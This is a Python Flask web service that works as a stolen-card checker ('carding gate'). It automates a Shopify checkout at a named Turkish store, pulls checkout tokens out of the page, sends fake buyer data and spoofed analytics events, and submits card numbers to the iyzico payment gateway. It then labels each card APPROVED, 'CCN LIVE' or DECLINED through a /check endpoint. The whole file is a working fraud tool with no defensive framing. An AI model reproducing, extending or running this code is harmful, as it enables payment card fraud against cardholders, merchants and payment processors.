import os, re, json, random, time, uuid, requests
from flask import Flask, request, jsonify
from urllib.parse import urljoin

app = Flask(__name__)

BASE_URL = os.environ.get("BASE_URL", "https://phlabturkiye.com")
VARIANT_ID = os.environ.get("VARIANT_ID", "49413933367586")
PRODUCT_HANDLE = os.environ.get("PRODUCT_HANDLE", "kojiso%E2%84%A2-temizleme-bari")
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"

def generate_uuid():
    return str(uuid.uuid4())

class IyzicoChecker:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": USER_AGENT})
        self.cookies = {}
        self.cart_token = ""
        self.checkout_url = ""
        self.session_token = ""
        self.queue_token = ""
        self.attempt_token = ""
        self.stable_id = ""
        self.signed_handle = ""
        self.iyzi_token = ""
        self.iyzi_session_id = ""
        self.iyzi_cookie = ""

    def _request(self, method, url, headers=None, data=None, json_data=None):
        if headers:
            self.session.headers.update(headers)
        if self.cookies:
            self.session.cookies.update(self.cookies)
        try:
            resp = self.session.request(method, url, data=data, json=json_data, timeout=45, allow_redirects=False)
        except Exception as e:
            return {"status": 0, "body": str(e), "redirect": ""}
        self.cookies.update(self.session.cookies.get_dict())
        location = resp.headers.get("Location", "")
        return {"status": resp.status_code, "body": resp.text, "redirect": location}

    def add_to_cart(self):
        url = f"{BASE_URL}/cart/add.js"
        headers = {"content-type": "application/json", "origin": BASE_URL, "referer": f"{BASE_URL}/products/{PRODUCT_HANDLE}"}
        self.cookies.setdefault("localization", "TR")
        self.cookies.setdefault("_shopify_y", generate_uuid())
        self.cookies.setdefault("_shopify_s", generate_uuid())
        self.cookies.setdefault("shopify_client_id", generate_uuid())
        payload = {"items": [{"id": int(VARIANT_ID), "quantity": 1, "properties": {}}]}
        resp = self._request("POST", url, headers=headers, json_data=payload)
        if resp["status"] != 200:
            return False
        if "cart" in self.cookies:
            self.cart_token = self.cookies["cart"].split("?")[0]
        return True

    def get_checkout(self):
        url = f"{BASE_URL}/checkouts/cn/{self.cart_token}/tr-tr" if self.cart_token else f"{BASE_URL}/checkout"
        headers = {"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "referer": f"{BASE_URL}/products/{PRODUCT_HANDLE}"}
        current_url = url
        for _ in range(5):
            resp = self._request("GET", current_url, headers=headers)
            if 300 <= resp["status"] < 400 and resp["redirect"]:
                current_url = resp["redirect"] if resp["redirect"].startswith("http") else urljoin(BASE_URL, resp["redirect"])
                self.checkout_url = current_url
                continue
            break
        if resp["status"] != 200:
            return False
        self.checkout_url = current_url
        body = resp["body"]
        self.session_token = re.search(r'sessionToken["\s:]+["\'](AAE[A-Za-z0-9_\-+=\/]+)["\']', body).group(1) if re.search(r'sessionToken["\s:]+["\'](AAE[A-Za-z0-9_\-+=\/]+)["\']', body) else ""
        self.queue_token = re.search(r'queueToken["\s:]+["\'](Ax[A-Za-z0-9_\-+=\/]+)["\']', body).group(1) if re.search(r'queueToken["\s:]+["\'](Ax[A-Za-z0-9_\-+=\/]+)["\']', body) else ""
        self.attempt_token = re.search(r'attemptToken["\s:]+["\']([\w\-]+)["\']', body).group(1) if re.search(r'attemptToken["\s:]+["\']([\w\-]+)["\']', body) else f"{self.cart_token}-{generate_uuid()[:16]}"
        self.stable_id = re.search(r'stableId["\s:]+["\']([\w\-]+)["\']', body).group(1) if re.search(r'stableId["\s:]+["\']([\w\-]+)["\']', body) else generate_uuid()
        self.signed_handle = re.search(r'signedHandle["\s:]+["\']([\w\+\/=\-]+)["\']', body).group(1) if re.search(r'signedHandle["\s:]+["\']([\w\+\/=\-]+)["\']', body) else ""
        if not self.cart_token:
            cart_match = re.search(r'checkouts/cn/([\w]+)', self.checkout_url)
            if cart_match:
                self.cart_token = cart_match.group(1)
        return True

    def submit_for_completion(self, email, first_name, last_name, phone):
        url = f"{BASE_URL}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion"
        headers = {
            "accept": "application/json", "content-type": "application/json",
            "origin": BASE_URL, "referer": self.checkout_url,
            "shopify-checkout-source": f'id="{self.cart_token}", type="cn"',
            "x-checkout-one-session-token": self.session_token,
        }
        address = {"address1": "dogkkdmdf", "city": "İSTANBUL", "countryCode": "TR", "firstName": first_name, "lastName": last_name, "phone": phone}
        input_data = {
            "sessionInput": {"sessionToken": self.session_token},
            "queueToken": self.queue_token or "Axpn1k41cyum8f-hOiMOFANKERyquhRmF9N9gvscLQem1Y7x3LVw-i6SDHWsNASwbSWJpTd48nQHrsliDSESikeFIEfKnvEDF1tKsnskB_o2pqb1g6j_iNnh4IhYUvsI93JpRmjxzA15LBw=",
            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
            "delivery": {
                "deliveryLines": [{
                    "destination": {"streetAddress": address},
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyByHandle": {
                            "handle": "ba5eae04f72fa075fafa5d02fe76a7b9-ae29b6b82cd53e4966aaa0d41946eae0",
                            "customDeliveryRate": False,
                        },
                        "options": {},
                    },
                    "targetMerchandiseLines": {"lines": [{"stableId": self.stable_id}]},
                    "deliveryMethodTypes": ["SHIPPING"],
                    "expectedTotalPrice": {"value": {"amount": "0.00", "currencyCode": "TRY"}},
                    "destinationChanged": False,
                }],
                "noDeliveryRequired": [],
                "useProgressiveRates": False,
                "supportsSplitShipping": True,
            },
            "deliveryExpectations": {"deliveryExpectationLines": [{"signedHandle": self.signed_handle}] if self.signed_handle else []},
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": self.stable_id,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{VARIANT_ID}",
                            "variantId": f"gid://shopify/ProductVariant/{VARIANT_ID}",
                            "properties": [],
                            "sellingPlanId": None,
                            "sellingPlanDigest": None,
                        },
                    },
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"value": {"amount": "469.00", "currencyCode": "TRY"}},
                    "lineComponents": [],
                }],
            },
            "memberships": {"memberships": []},
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [{
                    "paymentMethod": {
                        "offsitePaymentMethod": {
                            "name": "iyzico - Kredi ve Banka Kartları",
                            "paymentMethodIdentifier": "0b9b116d56e4115db6dd6d489111b44e",
                            "billingAddress": {"streetAddress": address},
                        }
                    },
                    "amount": {"value": {"amount": "469", "currencyCode": "TRY"}},
                }],
                "billingAddress": {"streetAddress": address},
            },
            "buyerIdentity": {
                "customer": {"presentmentCurrency": "TRY", "countryCode": "TR"},
                "email": email,
                "emailChanged": False,
                "phoneCountryCode": "TR",
                "marketingConsent": [{"email": {"consentState": "GRANTED", "value": email}}],
                "shopPayOptInPhone": {"number": phone, "countryCode": "TR"},
                "rememberMe": False,
            },
            "tip": {"tipLines": []},
            "taxes": {
                "proposedAllocations": None,
                "proposedTotalAmount": None,
                "proposedTotalIncludedAmount": {"value": {"amount": "78.17", "currencyCode": "TRY"}},
                "proposedExemptions": [],
            },
            "note": {
                "message": None,
                "customAttributes": [
                    {"key": "il-adi", "value": "İSTANBUL"},
                    {"key": "İlçe", "value": ""},
                    {"key": "Mahalle", "value": ""},
                ],
            },
            "localizationExtension": {"fields": []},
            "nonNegotiableTerms": None,
            "scriptFingerprint": {
                "signature": None,
                "signatureUuid": None,
                "lineItemScriptChanges": [],
                "paymentScriptChanges": [],
                "shippingScriptChanges": [],
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": [],
        }
        payload = {
            "variables": {
                "input": input_data,
                "attemptToken": self.attempt_token,
                "metafields": [],
                "analytics": {"requestUrl": self.checkout_url, "pageId": generate_uuid().upper()},
            },
            "operationName": "SubmitForCompletion",
            "id": "b6047b61264c44776db6b89cce9be9f2b646e9226af0681d7e7a0af7c1321293",
        }
        resp = self._request("POST", url, headers=headers, json_data=payload)
        if resp["status"] != 200:
            return None
        data = json.loads(resp["body"])
        submit_result = data.get("data", {}).get("submitForCompletion")
        if not submit_result:
            return None
        action = submit_result.get("action")
        if action:
            redirect_url = action.get("redirectUrl") or action.get("url")
            if redirect_url:
                return redirect_url
        receipt = submit_result.get("receipt")
        if receipt:
            po = receipt.get("purchaseOrder")
            if po:
                for act in po.get("actions", []):
                    rurl = act.get("redirectUrl") or act.get("url")
                    if rurl:
                        return rurl
                if po.get("sessionToken"):
                    self.session_token = po["sessionToken"]
                next_action = po.get("nextAction")
                if next_action:
                    rurl = next_action.get("redirectUrl") or next_action.get("url")
                    if rurl:
                        return rurl
        # fallback
        iyzi_match = re.search(r'iyzipay\.com[^"\']*retrieve/([a-f0-9\-]+)', resp["body"])
        if iyzi_match:
            self.iyzi_session_id = iyzi_match.group(1)
            return f"https://api.iyzipay.com/v2/shopify/payment/checkout/retrieve/{self.iyzi_session_id}"
        return None

    def get_iyzico_page(self, iyzi_url):
        headers = {"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "upgrade-insecure-requests": "1"}
        current_url = iyzi_url
        for _ in range(5):
            resp = self._request("GET", current_url, headers=headers)
            if 300 <= resp["status"] < 400 and resp["redirect"]:
                current_url = resp["redirect"] if resp["redirect"].startswith("http") else "https://api.iyzipay.com" + resp["redirect"]
                continue
            break
        body = resp["body"]
        token_match = re.search(r'iyziToken["\s:=]+["\']([\w\-]+)["\']', body) or re.search(r'token["\s:=]+["\']([\w\-]{36})["\']', body)
        if token_match:
            self.iyzi_token = token_match.group(1)
        sess_match = re.search(r'retrieve/([a-f0-9\-]+)', current_url)
        if sess_match:
            self.iyzi_session_id = sess_match.group(1)
        if "iyzi" in self.cookies:
            self.iyzi_cookie = self.cookies["iyzi"]
        return True

    def send_countly(self):
        url = "https://countly.iyzico.com/i"
        ts = int(time.time() * 1000)
        device_id = generate_uuid()
        events = [{
            "key": "[CLY]_action", "count": 1,
            "segmentation": {"type": "click", "x": 664, "y": 817, "width": 923, "height": 683,
                             "view": f"/v2/shopify/payment/checkout/retrieve/{self.iyzi_session_id}",
                             "domain": "api.iyzipay.com"},
            "timestamp": ts, "hour": int(time.strftime("%H")), "dow": int(time.strftime("%w")),
            "id": f"{random.randint(10000000,99999999)}{ts}", "cvid": f"{hash(str(ts))}{ts}",
        }]
        data = {
            "events": json.dumps(events),
            "app_key": "de7016e9b70331f97215d5c37f6e0ced6f14b152",
            "device_id": device_id,
            "sdk_name": "javascript_native_web",
            "sdk_version": "24.4.0",
            "t": 1,
            "av": "0.0",
            "metrics": json.dumps({"_ua": USER_AGENT}),
            "timestamp": ts,
            "hour": int(time.strftime("%H")),
            "dow": int(time.strftime("%w")),
            "rr": 1,
        }
        headers = {"content-type": "application/x-www-form-urlencoded", "origin": "https://api.iyzipay.com", "referer": "https://api.iyzipay.com/"}
        self._request("POST", url, headers=headers, data=data)
        return True

    def submit_card(self, cc, mm, yy, cvv, holder_name):
        url = "https://api.iyzipay.com/payment/iyzipos/checkoutform/auth/ecom"
        headers = {
            "Accept": "application/json", "Content-Type": "application/json",
            "Origin": "https://api.iyzipay.com",
            "Referer": f"https://api.iyzipay.com/v2/shopify/payment/checkout/retrieve/{self.iyzi_session_id}",
            "X-IYZI-TOKEN": self.iyzi_token,
        }
        if self.iyzi_cookie:
            self.session.cookies.set("iyzi", self.iyzi_cookie)
        payload = {
            "installment": 1,
            "paidPrice": 469,
            "paymentChannel": "WEB",
            "paymentCard": {
                "cardNumber": cc,
                "cardHolderName": holder_name,
                "expireYear": yy,
                "expireMonth": mm,
                "cvc": cvv,
                "registerConsumerCard": False,
                "registerCard": 0,
            },
            "browserFingerprint": {
                "language": "tr", "timezone": -180, "hasSessionStorage": True, "hasLocalStorage": True,
                "hasIndexedDb": True, "hasOpenDb": True, "platform": "false",
                "hasLiedLanguage": False, "hasLiedResolution": False, "hasLiedOS": False,
                "hasLiedBrowser": False, "maxTouchPoints": 0, "touchEventSuccess": False,
                "hasTouchStart": False, "fingerprintHash": "",
            },
            "pwiMetadata": {"lightRedesign": ["false"], "pwiGrowthActionDisabled": ["false"]},
        }
        resp = self._request("POST", url, headers=headers, json_data=payload)
        return resp

    def check(self, card_input):
        parts = card_input.split("|")
        if len(parts) != 4:
            return {"status": "ERROR", "message": "Invalid format CC|MM|YY|CVC", "price": "-"}
        cc, mm, yy, cvv = parts
        email = f"user{random.randint(1000,9999)}@gmail.com"
        first_name, last_name = "Mehmet", "Yilmaz"
        phone = f"5{random.randint(300000000, 599999999)}"
        holder_name = f"{first_name} {last_name}"

        if not self.add_to_cart():
            return {"status": "ERROR", "message": "Cart failed", "price": "-"}
        if not self.get_checkout():
            return {"status": "ERROR", "message": "Checkout page failed", "price": "-"}
        iyzi_url = self.submit_for_completion(email, first_name, last_name, phone)
        if not iyzi_url:
            return {"status": "ERROR", "message": "SubmitForCompletion failed", "price": "-"}
        if not self.get_iyzico_page(iyzi_url):
            return {"status": "ERROR", "message": "iyzico page failed", "price": "-"}
        if not self.iyzi_token:
            return {"status": "ERROR", "message": "No iyzico token", "price": "-"}
        self.send_countly()
        result = self.submit_card(cc, mm, yy, cvv, holder_name)
        try:
            data = json.loads(result["body"])
        except:
            return {"status": "ERROR", "message": f"HTTP {result['status']}", "price": "-"}
        status = data.get("status", "")
        error_code = data.get("errorCode", "")
        error_message = data.get("errorMessage", "")
        payment_status = data.get("paymentStatus", "")
        if status == "success" or payment_status == "SUCCESS":
            return {"status": "APPROVED", "message": "Payment successful", "price": "469.00"}
        elif status == "failure":
            if "10051" in error_code or "bakiye" in error_message.lower() or "insufficient" in error_message.lower():
                return {"status": "APPROVED", "message": f"CCN LIVE ({error_message})", "price": "469.00"}
            return {"status": "DECLINED", "message": f"[{error_code}] {error_message}", "price": "-"}
        return {"status": "DECLINED", "message": f"Unknown response", "price": "-"}

@app.route("/check", methods=["GET"])
def check():
    cc = request.args.get("cc")
    if not cc:
        return jsonify({"Response": "Missing cc", "Price": "-", "Gate": "iyzico"}), 400
    checker = IyzicoChecker()
    result = checker.check(cc)
    if result["status"] == "APPROVED":
        return jsonify({"Response": result["message"], "Price": result["price"], "Gate": "iyzico"})
    elif result["status"] == "DECLINED":
        return jsonify({"Response": result["message"], "Price": "-", "Gate": "iyzico"})
    else:
        return jsonify({"Response": f"Error: {result['message']}", "Price": "-", "Gate": "iyzico"})

@app.route("/health")
def health():
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
